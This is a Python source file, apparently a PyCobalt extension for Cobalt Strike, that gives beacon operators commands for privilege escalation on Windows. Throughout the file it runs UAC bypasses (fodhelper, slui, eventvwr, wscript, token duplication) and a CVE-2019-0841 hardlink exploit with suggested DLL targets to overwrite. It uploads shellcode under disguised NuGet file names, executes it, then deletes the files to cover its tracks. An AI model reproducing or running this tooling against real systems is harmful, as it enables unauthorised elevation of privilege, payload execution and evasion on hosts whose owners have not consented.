#!/usr/bin/env python3

import sys
import utils
sys.path.insert(0, utils.basedir('pycobalt'))

import pycobalt.engine as engine
import pycobalt.events as events
import pycobalt.commands as commands
import pycobalt.aliases as aliases
import pycobalt.aggressor as aggressor
import pycobalt.callbacks as callbacks
import pycobalt.helpers as helpers
from pycobalt.helpers import powershell_quote
import pycobalt.utils

import external

@aliases.alias('powerup', 'Run PowerUp')
def _(bid, *args):
    external.run(bid, 'powerup', '$FormatEnumerationLimit=-1; ' + ' '.join(args))

@aliases.alias('powerup-all', 'Run PowerUp Invoke-AllChecks')
def _(bid, *args):
    external.run(bid, 'powerup', '$FormatEnumerationLimit=-1; Invoke-AllChecks | Format-List' + ' '.join(args))

@aliases.alias('import-powerup', 'Import PowerUp')
def _(bid):
    external.import_script(bid, 'powerup')

@aliases.alias('sharpup', 'Run SharpUp')
def _(bid, *args):
    external.run(bid, 'sharpup', args)

def elevate_token_shellcode_csharp(bid, shellcode):
    """
    Elevate with token duplication bypass. Execute `shellcode` with a C# helper.
    """

    aggressor.bpowershell_import(bid, utils.basedir('modules/FilelessUACBypass.ps1'))

    execute_shellcode = utils.basedir('tools/execute_shellcode.exe')
    execute_assembly = utils.basedir('tools/execute_assembly.exe')
    stage1 = r'{}\NugetPackage.exe'.format(helpers.guess_temp(bid))
    #stage2 = r'{}\nuget_update.package'.format(helpers.guess_temp(bid))
    stage2 = r'{}\Stage2.exe'.format(helpers.guess_temp(bid))
    package = r'{}\nuget.package'.format(helpers.guess_temp(bid))

    helpers.upload_to(bid, execute_assembly, stage1)
    helpers.upload_to(bid, execute_shellcode, stage2)
    helpers.upload_to(bid, shellcode, package)

    command = 'Invoke-TokenDuplication -Binary {}'.format(powershell_quote(stage2))
    aggressor.bpowerpick(bid, command)

    aggressor.brm(bid, stage1)
    aggressor.brm(bid, stage2)
    aggressor.brm(bid, package)

def elevate_shellcode_helper(bid, shellcode, function):
    """
    Execute `shellcode` with a helper using <function> -Binary helper.exe -Arguments <shellcode>
    """

    native_helper = utils.basedir('tools/native.exe')
    native_helper_remote = r'{}\NugetPackage.exe'.format(helpers.guess_temp(bid))
    shellcode_remote = r'{}\nuget.package'.format(helpers.guess_temp(bid))

    # delete first
    aggressor.brm(bid, native_helper_remote, silent=True)
    aggressor.brm(bid, shellcode_remote, silent=True)

    # upload
    helpers.upload_to(bid, native_helper, native_helper_remote, silent=True)
    helpers.upload_to(bid, shellcode, shellcode_remote, silent=True)

    # invoke
    command = '{} {}'.format(native_helper_remote, shellcode_remote)
    function(bid, command)

    # clean up
    aggressor.brm(bid, native_helper_remote, silent=True)
    aggressor.brm(bid, shellcode_remote, silent=True)

def elevate_token_shellcode(bid, shellcode):
    """
    Elevate with token duplication bypass and shellcode spawner.
    """

    elevate_shellcode_helper(bid, shellcode, elevate_token_command)

def elevate_token_command(bid, command, *other_args):
    """
    Elevate with token duplication bypass. Execute `command` with `arguments`.
    """

    command, *arguments = command.split()

    aggressor.bpowershell_import(bid, utils.basedir('modules/FilelessUACBypass.ps1'))
    powershell = 'Invoke-TokenDuplication -Binary {} '.format(powershell_quote(command))

    if arguments:
        powershell += '-Arguments {} '.format(powershell_quote(' '.join(arguments)))

    if other_args:
        powershell += ' '.join(other_args)

    aggressor.bpowerpick(bid, powershell)

def elevate_slui_shellcode(bid, shellcode):
    """
    Elevate with slui bypass and shellcode spawner.
    """

    elevate_shellcode_helper(bid, shellcode, elevate_slui_command)

def elevate_slui_command(bid, command):
    """
    Elevate with slui bypass.
    """

    aggressor.bpowershell_import(bid, utils.basedir('modules/FilelessUACBypass.ps1'))
    aggressor.bpowerpick(bid, 'Invoke-SluiBypass -Command {}'.format(powershell_quote(command)))

def elevate_fodhelper_shellcode(bid, shellcode):
    """
    Elevate with fodhelper bypass and shellcode spawner.
    """

    elevate_shellcode_helper(bid, shellcode, elevate_fodhelper_command)

def elevate_fodhelper_command(bid, command):
    """
    Elevate with fodhelper bypass.
    """

    aggressor.bpowershell_import(bid, utils.basedir('modules/FilelessUACBypass.ps1'))
    aggressor.bpowerpick(bid, 'Invoke-FodhelperBypass -Command {}'.format(powershell_quote(command)))

def elevate_eventvwr_command(bid, command):
    """
    Elevate with eventvwr bypass.
    """

    aggressor.bpowershell_import(bid, utils.basedir('modules/Invoke-EventVwrBypass.ps1'))
    aggressor.bpowerpick(bid, 'Invoke-EventVwrBypass -Command {}'.format(powershell_quote(command)))

def elevate_wscript_shellcode(bid, shellcode):
    """
    Elevate with wscript bypass and shellcode spawner.
    """

    elevate_shellcode_helper(bid, shellcode, elevate_wscript_command)

def elevate_wscript_command(bid, command):
    """
    Elevate with wscript bypass.
    """

    aggressor.bpowershell_import(bid, utils.basedir('modules/Invoke-WScriptBypassUAC.ps1'))
    aggressor.bpowerpick(bid, 'Invoke-WScriptBypassUAC -payload {}'.format(powershell_quote(command)))

def elevate_runas_shellcode(bid, user, password, shellcode):
    """
    Elevate with token duplication bypass. Execute `shellcode` with a helper.
    """

    native_helper = utils.basedir('tools/native.exe')
    native_helper_remote = r'{}\NugetPackage.{}.exe'.format(helpers.guess_temp(bid), helpers.randstr())
    shellcode_remote = r'{}\nuget2.package'.format(helpers.guess_temp(bid))

    # delete first
    aggressor.brm(bid, native_helper_remote, silent=True)
    aggressor.brm(bid, shellcode_remote, silent=True)

    aggressor.blog2(bid, 'uploading to {} and {}'.format(native_helper_remote, shellcode_remote))

    # upload
    helpers.upload_to(bid, native_helper, native_helper_remote, silent=True)
    helpers.upload_to(bid, shellcode, shellcode_remote, silent=True)

    if '\\' in user:
        domain, user = user.split('\\')
    else:
        raise RuntimeError('must specify user domain')

    # invoke
    aggressor.brunas(bid, domain, user, password, native_helper_remote)

    # clean up
    aggressor.brm(bid, native_helper_remote, silent=True)
    aggressor.brm(bid, shellcode_remote, silent=True)

def elevate_cve_2019_0841(bid, target, overwrite=None):
    r"""
    Elevate with CVE-2019-0841. Change permissions of 'target'. Optionally
    overwrite 'target' with 'overwrite'.

    Good overwrite options:
      - C:\Program Files\LAPS\CSE\AdmPwd.dll (then run gpupdate)
      - C:\Program Files (x86)\Google\Update\1.3.34.7\psmachine.dll (then wait for google update or run it manually)
    """

    native_hardlink_ps1 = utils.basedir('powershell/Native-HardLink.ps1')
    edge_dir = r'$env:localappdata\Packages\Microsoft.MicrosoftEdge_*'
    settings_dat = r'\Settings\settings.dat'

    command = helpers.code_string(r"""
        # Stop Edge
        echo "[.] Stopping Edge"
        $process = Get-Process -Name MicrosoftEdge 2>$null
        if ($process) {{
            $process | Stop-Process
        }}
        sleep 3
        
        # Hardlink
        $edge_dir = Resolve-Path {edge_dir}
        $settings_dat = $edge_dir.Path + '{settings_dat}'
        echo "[.] Making Hardlink from $settings_dat to {target}"
        rm $settings_dat
        Native-HardLink -Verbose -Link $settings_dat -Target {target}
        
        # Start Edge
        echo "[.] Starting Edge"
        Start Microsoft-Edge:
        sleep 3
        
        # Stop it again
        echo "[.] Stopping Edge"
        $process = Get-Process -Name MicrosoftEdge 2>$null
        if ($process) {{
            $process | Stop-Process
        }}

        echo "[+] All Finished!"
        echo "[.] New ACLs:"
        Get-Acl {target} | Format-List
        """.format(edge_dir=edge_dir, settings_dat=settings_dat, target=powershell_quote(target)))

    aggressor.bpowershell_import(bid, native_hardlink_ps1, silent=True)
    aggressor.bpowerpick(bid, command, silent=True)

    if overwrite:
        helpers.upload_to(bid, overwrite, target)
        helpers.explorer_stomp(bid, target)

@aliases.alias('elevate-custom', 'Run custom elevate commands')
def _(bid, exploit, *args):
    callbacks = {
                    'token-shellcode': elevate_token_shellcode,
                    'token-command': elevate_token_command,
                    'slui-shellcode': elevate_slui_shellcode,
                    'slui-command': elevate_slui_command,
                    'fodhelper-shellcode': elevate_fodhelper_shellcode,
                    'fodhelper-command': elevate_fodhelper_command,
                    'eventvwr-command': elevate_eventvwr_command,
                    'wscript-shellcode': elevate_wscript_shellcode,
                    'wscript-command': elevate_wscript_command,
                    'runas-shellcode': elevate_runas_shellcode,
                    'cve-2019-0841': elevate_cve_2019_0841,
                }

    if exploit in callbacks:
        aggressor.btask(bid, 'Tasked beacon to elevate with exploit: {}'.format(exploit))
        callback = callbacks[exploit]

        if not pycobalt.utils.check_args(callback, (bid,) + args):
            signature = pycobalt.utils.signature(callback, trim=1)
            aggressor.berror(bid, 'Invalid arguments to exploit {}. Signature: {}'.format(exploit, signature))
            return

        callback(bid, *args)
    else:
        aggressor.berror(bid, 'Exploit must be one of: {}'.format(', '.join(callbacks.keys())))

